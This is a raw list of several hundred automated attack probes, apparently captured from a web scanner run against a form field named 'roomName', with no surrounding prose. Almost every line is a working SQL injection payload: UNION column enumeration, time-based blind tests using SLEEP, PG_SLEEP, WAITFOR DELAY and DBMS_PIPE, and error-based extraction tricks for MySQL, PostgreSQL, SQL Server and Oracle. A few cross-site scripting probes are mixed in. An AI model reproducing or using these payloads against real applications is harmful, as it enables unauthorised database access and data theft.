1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#"><pre><code>1%' AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))) AND '%'='
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ASOr
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1%' AND SLEEP(5) AND '%'='
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rOre
1 UNION ALL SELECT NULL,NULL,NULL#
1') AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))) AND ('Tpez'='Tpez
1%' UNION ALL SELECT NULL,NULL-- Yiqi
-1928) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x66796551546c4c427073,0x716b767071)#
-7730) UNION ALL SELECT NULL,CONCAT(0x71626a7a71,0x4f765a4a57785671556957694d75516568647a456d656f4259786c4a797370706271537345716d70,0x716b767071),NULL,NULL,NULL,NULL,NULL#
wrBEIRqX" AND 2*3*8=6*8 AND "yIOj"="yIOj
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Cwml
1' UNION ALL SELECT NULL-- SYro
1' UNION ALL SELECT NULL,NULL,NULL,NULL#
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- diBB
1) AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5) AND (3100=3100
1' UNION ALL SELECT NULL,NULL-- RIna
1) UNION ALL SELECT 84,84,84,84,84,CONCAT(0x71626a7a71,0x53624857707a6d5570666852696a4d5a796f586262664c4969495a784959715a6a766241624a7772,0x716b767071),84#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
1';SELECT SLEEP(5)#
x2akMEYO' OR 853=(SELECT 853 FROM PG_SLEEP(15))--
1') AND 5484=5484 AND ('cspH'='cspH
-6748) UNION ALL SELECT CONCAT(0x71626a7a71,0x61706e684a5371736a4157685a566164417274754c564f57514d47775851736268725973756a767a,0x716b767071),84,84,84,84,84,84#
1 AND 4359=3133-- FVJr
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
1';WAITFOR DELAY '0:0:5'--
1 UNION ALL SELECT NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jHgB
0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z
1') AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND ('jIWd'='jIWd
1') UNION ALL SELECT NULL,NULL#
HTcKUEXA
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1%' AND 5484=5484 AND '%'='
1' AND 4713=(SELECT 4713 FROM PG_SLEEP(5)) AND 'krGd'='krGd
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TCPs
1' UNION ALL SELECT NULL,NULL,NULL-- BiPU
1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x4c5a4375434d586c6f48,0x716b767071),NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- iduR
1 ����%2527%2522
roomName
1 UNION ALL SELECT NULL-- xPNV
1' UNION ALL SELECT NULL,NULL,NULL,NULL-- YkQL
1 ORDER BY 8291-- VcRK
-7134) UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7a71,0x7a6970694a5a48456174,0x716b767071),NULL,NULL,NULL,NULL#
1');SELECT PG_SLEEP(5)--
roomName' RLIKE (SELECT (CASE WHEN (390=390) THEN 1 ELSE 0x28 END)) -- 
-1 OR 2+970-970-1=0+0+0+1
1 waitfor delay '0:0:15' -- 
1' AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'AXBm'='AXBm
1%';SELECT PG_SLEEP(5)--
roomName%' AND 2*3*8=6*8 AND '5Ukf'!='5Ukf%
3ermCoKp')) OR 456=(SELECT 456 FROM PG_SLEEP(15))--
kDXJepLC')) OR 602=(SELECT 602 FROM PG_SLEEP(15))--
1) UNION ALL SELECT 84,84,84,84,CONCAT(0x71626a7a71,0x516f464e537376524b464146676564716a487476687a5a705a774a7559786d425151484644717843,0x716b767071),84,84#
if(now()=sysdate(),sleep(15),0)
1) UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7a71,0x674c4965727275644a42,0x716b767071),NULL,NULL,NULL,NULL#
1) ORDER BY 1#
1%' UNION ALL SELECT NULL-- YEmt
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x5a775362724544414e59,0x716b767071)#
1 AND 1697=3859
1 AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
-6303) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7a71,0x4c7559706776524b43595856626e4a454153714a634d4e456b5243587a79715a4e52747943535171,0x716b767071),NULL,NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZJho
@@tQpVX
1') AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('ZfJx'='ZfJx
vfGkQdSQ' OR 525=(SELECT 525 FROM PG_SLEEP(15))--
1') UNION ALL SELECT NULL#
1 AND 5484=5484
1) ORDER BY 6069#
'"()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;ANRV(9919)&lt;/ScRiPt&gt;
wrBEIRqX9320805
1) UNION ALL SELECT 84,84,84,CONCAT(0x71626a7a71,0x70725a666c754458766d4a79585455786e66586b61586f63636a646f5a6d5a70434f45744c4a5a6a,0x716b767071),84,84,84#
1') UNION ALL SELECT NULL,NULL,NULL#
1 AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- LYlf
1) UNION ALL SELECT 84,84,84,CONCAT(0x71626a7a71,0x476d794c657459476876,0x716b767071),84,84,84#
1) UNION ALL SELECT CONCAT(0x71626a7a71,0x57486857587246726a6e,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL#
1%' ORDER BY 1#
14axyP8M'
ZMskyuza'||'
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL-- YVEW
1') UNION ALL SELECT NULL-- MNDJ
-1 OR 2+456-456-1=0+0+0+1
1');WAITFOR DELAY '0:0:5'--
1) AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND (3016=3016
-8531) UNION ALL SELECT 84,84,84,CONCAT(0x71626a7a71,0x584c56434a626353486d41525047496e5a715945627a447951446a55687877624d5466734f496170,0x716b767071),84,84,84#
1);WAITFOR DELAY '0:0:5'--
1
b8YtBRUh
1 AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)-- BNNL
1 ORDER BY 1-- gGgz
1 UNION ALL SELECT NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- epNn
1%';WAITFOR DELAY '0:0:5'--
1' AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))) AND 'HaEX'='HaEX
1) UNION ALL SELECT CONCAT(0x71626a7a71,0x56545969686a527a624e,0x716b767071),84,84,84,84,84,84#
1' AND 5484=5484 AND 'rtNY'='rtNY
1') AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND ('fXnT'='fXnT
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
1()''(..".'
@@Sk7s5
1) UNION ALL SELECT 84,84,84,84,84,CONCAT(0x71626a7a71,0x6a734c69676865586659,0x716b767071),84#
1) ORDER BY 6493-- TqNZ
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- iRGa
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- pSnJ
1) UNION ALL SELECT 84,84,84,84,CONCAT(0x71626a7a71,0x7551696b665476557066,0x716b767071),84,84#
1) UNION ALL SELECT 84,84,CONCAT(0x71626a7a71,0x79545942664b62494f5a78564a4643716e726e65684a694d4c506641504e665970765562685a4153,0x716b767071),84,84,84,84#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
-1 OR 3+970-970-1=0+0+0+1
1) UNION ALL SELECT NULL,NULL,CONCAT(0x71626a7a71,0x514b69714f7a7570735373637150646e6f6773466e785a444a484850734e544e696c5764694c7773,0x716b767071),NULL,NULL,NULL,NULL#
(SELECT (CASE WHEN (8286=8286) THEN 8286 ELSE 8286*(SELECT 8286 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))
roomName'||'
1) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7a71,0x75726d73544954504c77,0x716b767071),NULL,NULL,NULL#
(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (1011=1011) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))
1) AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (3239=3239
1 ORDER BY 1#
-1186) UNION ALL SELECT 84,CONCAT(0x71626a7a71,0x5270676c576b494a714e59697a4a4b6a706b4d58455747735546765959746544526c714857447178,0x716b767071),84,84,84,84,84#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x76707448566d7350647a6a4b6771446953626778426454754d7259465856566a6650667048674b59,0x716b767071)#
1%' UNION ALL SELECT NULL,NULL,NULL,NULL#
1 ORDER BY 4128-- bWMM
-1317) UNION ALL SELECT 84,84,84,84,84,84,CONCAT(0x71626a7a71,0x764e7a4e47456a7a77517049456151444b6c696346716943706d6a746e4e57446868594b50517068,0x716b767071)#
1);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
1dRrFNpAO
1 AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5)
1%' AND 3475=CAST((CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113))||(SELECT (CASE WHEN (3475=3475) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND '%'='
7138
roomName" AND 2*3*8=6*8 AND "wsGr"="wsGr
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 AND 5484=5484-- QLNN
1') AND SLEEP(5) AND ('CycD'='CycD
1 AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)))-- zUWv
1'"
1%' AND 1297=4891 AND '%'='
-7859) UNION ALL SELECT 84,84,CONCAT(0x71626a7a71,0x736d4b47696576637475,0x716b767071),84,84,84,84#
1) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7a71,0x6a485161686b786f43544f7258534362725747544d6f754777506c644f5877587350446d4d5a4649,0x716b767071),NULL,NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL,NULL-- LiiF
1) UNION ALL SELECT CONCAT(0x71626a7a71,0x4d42517271554d437a4946645650617a506f43575875557750427556536a674b6953456858706c61,0x716b767071),84,84,84,84,84,84#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
1);SELECT SLEEP(5)#
nzbdOVb6
wrBEIRqX'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
wrBEIRqX' AND 2*3*8=6*8 AND 'mEZy'='mEZy
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1') ORDER BY 7678-- ULSz
lS7YI22j
1) AND 5202=2985 AND (6694=6694
1';SELECT PG_SLEEP(5)--
1;WAITFOR DELAY '0:0:5'--
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- XhkD
1) UNION ALL SELECT CONCAT(0x71626a7a71,0x75747443564170567275575768636e67755a695075707675656a554247546147414470476f69434a,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL#
1) AND SLEEP(5) AND (3268=3268
1%' UNION ALL SELECT NULL,NULL,NULL,NULL-- ztgR
ZMskyuza'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- vPIR
jQEIMpjz'
idRYCgFU') OR 452=(SELECT 452 FROM PG_SLEEP(15))--
1';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
roomName' AND 2*3*8=6*8 AND 'Xa1K'='Xa1K
wrBEIRqX9184245
1 AND SLEEP(5)-- BVJC
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ZvEV
1) UNION ALL SELECT NULL,CONCAT(0x71626a7a71,0x48776363626c666b617a,0x716b767071),NULL,NULL,NULL,NULL,NULL#
1') UNION ALL SELECT NULL,NULL,NULL-- Pqht
1) UNION ALL SELECT 84,84,84,84,84,84,CONCAT(0x71626a7a71,0x6e616b6f506463436843,0x716b767071)#
1) WAITFOR DELAY '0:0:5' AND (8038=8038
1%' AND (SELECT 8736 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(8736=8736,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- gfnN
1') AND 4713=(SELECT 4713 FROM PG_SLEEP(5)) AND ('FAgj'='FAgj
ZMskyuza" AND 2*3*8=6*8 AND "wNPF"="wNPF
ai
1%' AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5) AND '%'='
-7250) UNION ALL SELECT 84,84,84,84,CONCAT(0x71626a7a71,0x48666e49546f787379625a725a494b745352704b5a746377636163586e636668684e6e637a5a7765,0x716b767071),84,84#
-1 OR 3+183-183-1=0+0+0+1
-1 OR 3+694-694-1=0+0+0+1
1) UNION ALL SELECT NULL,CONCAT(0x71626a7a71,0x6d74754f5475586c696656655a444369746a41664d69596a4e664e624b5452547054634d72537a42,0x716b767071),NULL,NULL,NULL,NULL,NULL#
(SELECT CONCAT(0x71626a7a71,(SELECT (ELT(2675=2675,1))),0x716b767071))
1);SELECT PG_SLEEP(5)--
1) UNION ALL SELECT 84,CONCAT(0x71626a7a71,0x67477a71754e52627778534d63507669635046575a61476146414c786f7652524858784f52584578,0x716b767071),84,84,84,84,84#
-3552) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x496e5045486a4b415871,0x716b767071),NULL#
1) UNION ALL SELECT 84,CONCAT(0x71626a7a71,0x77586677566b6f526f69,0x716b767071),84,84,84,84,84#
1' AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'EjLc'='EjLc
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cTPC
1') WAITFOR DELAY '0:0:5' AND ('SxSZ'='SxSZ
d2ouLMWV' OR 403=(SELECT 403 FROM PG_SLEEP(15))--
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KMwn
OVPJOgGS') OR 941=(SELECT 941 FROM PG_SLEEP(15))--
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bJCU
1 WAITFOR DELAY '0:0:5'
-3591) UNION ALL SELECT 84,84,84,84,CONCAT(0x71626a7a71,0x6549637a63555142616b,0x716b767071),84,84#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
-8187) UNION ALL SELECT 84,84,CONCAT(0x71626a7a71,0x43796c6c6a59717363524e7254616a7446446e536d796a62524f59454a4a65447147667579475345,0x716b767071),84,84,84,84#
1 ORDER BY 1-- uXyH
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VWgQ
1') AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5) AND ('Qryc'='Qryc
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1 UNION ALL SELECT NULL-- CQSF
1%' AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='
-1184) UNION ALL SELECT 84,84,84,84,84,CONCAT(0x71626a7a71,0x715263564759536d7346,0x716b767071),84#
1%' UNION ALL SELECT NULL,NULL,NULL-- DLaG
W9SK4UDL') OR 655=(SELECT 655 FROM PG_SLEEP(15))--
@@a9I6B
-9021) UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a7a71,0x51595962644e69414754,0x716b767071),NULL,NULL,NULL#
1 AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)-- IbkC
(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
1' ORDER BY 6174#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eCaH
1) UNION ALL SELECT NULL,NULL-- OMfo
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
wrBEIRqX'"()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;ANRV(9860)&lt;/ScRiPt&gt;
-4725) UNION ALL SELECT NULL,CONCAT(0x71626a7a71,0x4d66545961794e677556,0x716b767071),NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL#
ZMskyuza' AND 2*3*8=6*8 AND 'sELl'='sELl
(SELECT 3524 FROM(SELECT COUNT(*),CONCAT(0x71626a7a71,(SELECT (ELT(3524=3524,1))),0x716b767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
1;SELECT PG_SLEEP(5)--
1) AND 5484=5484 AND (8176=8176
1' WAITFOR DELAY '0:0:5' AND 'qHoJ'='qHoJ
wrBEIRqX%' AND 2*3*8=6*8 AND 'PH7N'!='PH7N%
1 WAITFOR DELAY '0:0:5'-- jCMh
1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- TyHM
-6239) UNION ALL SELECT 84,84,84,84,84,84,CONCAT(0x71626a7a71,0x4c706b78756b44506a62,0x716b767071)#
@@0qAKt
1') UNION ALL SELECT NULL,NULL,NULL,NULL#
1') UNION ALL SELECT NULL,NULL-- rfMp
1) UNION ALL SELECT 84,84,84,84,84,84,CONCAT(0x71626a7a71,0x6259557669665848756e686b73616579676c7654554a4f5a57624f5a447459625a445a5156794a7a,0x716b767071)#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x6b704d746b4241434d7a72697343576c52735372787563617a6a6c4e504a7273534a447445645365,0x716b767071),NULL#
pD77XZgu'; waitfor delay '0:0:15' -- 
'"()&amp;%&lt;acx&gt;&lt;ScRiPt &gt;nrJK(9460)&lt;/ScRiPt&gt;
38cXhYPe'; waitfor delay '0:0:15' -- 
1;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
1%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT NULL-- TBEj
1) AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113))) AND (9400=9400
1%' WAITFOR DELAY '0:0:5' AND '%'='
1) UNION ALL SELECT NULL,NULL#
1') AND 6919=2043 AND ('uOqr'='uOqr
-1 OR 2+183-183-1=0+0+0+1
1%' UNION ALL SELECT NULL,NULL,NULL#
1 AND SLEEP(5)
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x4f51745246466a425744,0x716b767071),NULL#
4hUZpeUY') OR 952=(SELECT 952 FROM PG_SLEEP(15))--
1 AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5)-- HoJA
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
xpHFE4WW')) OR 992=(SELECT 992 FROM PG_SLEEP(15))--
1%' UNION ALL SELECT NULL#
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
1');SELECT SLEEP(5)#
1' ORDER BY 1-- uSpj
1' UNION ALL SELECT NULL,NULL,NULL#
1) AND 1883=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(106)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (1883=1883) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(107)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (8678=8678
1%' ORDER BY 7537-- nvdt
ZMskyuza%' AND 2*3*8=6*8 AND 'CPCD'!='CPCD%
1%';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(108)||CHR(77)||CHR(78)||CHR(116),5) FROM DUAL--
1 ORDER BY 4399#
-1330) UNION ALL SELECT 84,84,84,84,84,CONCAT(0x71626a7a71,0x5a6e7766597074614852724c6c506e535374504d4a445365564e5857597478726e77635651586e51,0x716b767071),84#
-6360) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x4b63706471687967445859567a596b67716e42784b6264515764726347505245484951626f715158,0x716b767071),NULL,NULL#
1) UNION ALL SELECT NULL,NULL,NULL-- Ekou
1' AND 4263=DBMS_PIPE.RECEIVE_MESSAGE(CHR(109)||CHR(103)||CHR(102)||CHR(101),5) AND 'MQHR'='MQHR
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
1) UNION ALL SELECT 84,84,CONCAT(0x71626a7a71,0x6963704a657245786251,0x716b767071),84,84,84,84#
OZvdt3b6' OR 440=(SELECT 440 FROM PG_SLEEP(15))--
-1 OR 2+694-694-1=0+0+0+1
roomName%' AND 2*3*8=6*8 AND 'Yd5V'!='Yd5V%
1) UNION ALL SELECT NULL,NULL,NULL,NULL-- VrfR
wrBEIRqX
1' ORDER BY 1#
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FWBU
1) ORDER BY 1-- LSYw
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qahd
1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BeKj
1') UNION ALL SELECT NULL,NULL,NULL,NULL-- rFSc
-3635) UNION ALL SELECT 84,CONCAT(0x71626a7a71,0x784e4f6b546973794b7a,0x716b767071),84,84,84,84,84#
wrBEIRqX'||'
1yd4r3l8O
wrBEIRqX' RLIKE (SELECT (CASE WHEN (767=767) THEN 1 ELSE 0x28 END)) -- 
1 AND 4713=(SELECT 4713 FROM PG_SLEEP(5))
1'ybxvuU&lt;'"&gt;iKxVhF
1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ygut
1%' ORDER BY 1-- JeJc
-1 OR 3+456-456-1=0+0+0+1
-3182) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x76526c4c514e4c72456a497a58644f69724f4659636375664e4c6252596e5268435a44626e4b6967,0x716b767071),NULL#
-7939) UNION ALL SELECT CONCAT(0x71626a7a71,0x4f67526550496465696c446f436a7a4e556e48444e6f66765a797769507744416265527646576442,0x716b767071),NULL,NULL,NULL,NULL,NULL,NULL#
Cnq1sxn6')) OR 326=(SELECT 326 FROM PG_SLEEP(15))--
1) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Eqax
roomName" AND 2*3*8=6*8 AND "NL3z"="NL3z
1 AND 2649=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(106)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2649=2649) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(118)+CHAR(112)+CHAR(113)))
1) UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7a71,0x5153504572627a4b4375774f4a6861514a7778517567685a7a427271796b5477477059764c74755a,0x716b767071),NULL,NULL#
1 UNION ALL SELECT NULL,NULL,NULL-- Gdor
1 UNION ALL SELECT NULL,NULL#
roomName'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'
